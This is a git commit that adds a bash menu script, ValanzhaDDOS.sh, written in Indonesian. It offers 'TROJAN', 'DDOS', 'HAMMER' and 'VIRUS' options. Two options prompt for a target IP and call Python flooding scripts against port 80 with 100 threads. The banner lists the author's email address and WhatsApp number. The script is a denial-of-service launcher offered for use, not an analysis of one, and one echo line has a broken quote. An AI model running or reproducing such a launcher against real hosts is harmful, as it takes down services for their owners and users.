9525fcc9cecfe35250d273be1025cf4c123fec41
Valanzha <53247478+Valanzha@users.noreply.github.com>
2019-07-24 11:35:54 +0700

    Create ValanzhaDDOS.sh

---
+++ ValanzhaDDOS.sh
@@ -0,0 +1,52 @@
+blue='\033[34;1m'
+green='\033[32;1m'  
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'                                           
+yellow='\033[33;1m'
+clear
+toilet -f slant " DDOS VALANZHA " |lolcat
+echo
+echo
+echo $blue"---------------------------------------"
+echo $blue"AUTOUR  :VALANZHA QUEEN "
+echo $blue"VERSION :1.0"
+echo $blue"JUDUL     :DDOS VALANZHA "
+echo $red"---------------------------------------"
+echo $green"?Contact :tanniza047@gmail.com         "
+echo $green"?WhatsApp:+6283852572837              "
+echo $green"?Message :Jangan Di Recode Ya Zeyeenkkk      "
+echo $red"---------------------------------------"
+echo $yellow" Kiss Dari ValanzhaQueen EMMUACH
+echo $red"---------------------------------------"
+echo $white"[1].Valanzha TROJAN"
+echo $white"[2].Valanzha DROID"
+echo $white"[3].Valanzha DDOS"
+echo $white"[4].Valanzha HAMMER"
+echo $white"[5].Valanzha VIRUS"
+echo $white"[0].EXIT"
+echo $red"---------------------------------------"
+echo $red"MASUKAN PILIHANMU ZEYENK"
+read -p "PILIH>>==>" bro;
+echo
+if [ $bro = 1 ] || [ $bro = 1 ]
+then
+clear
+toilet -f slant " Valanzha TROJAN " |lolcat
+echo $red"MASUKAN IP TARGET"
+read -p "===>" ipt
+clear
+echo
+python win.32.64.NT.py -s$ipt -p80 -t100
+fi
+
+if [ $bro = 2 ] || [ $bro = 2 ]
+then
+toilet -f slant " Valanzha DROID " |lolcat
+echo $red"MASUKAN IP TARGET"
+read -p "===>" ipt
+clear
+echo
+python andromeda.py -s$ipt -p80 -t100
+fi
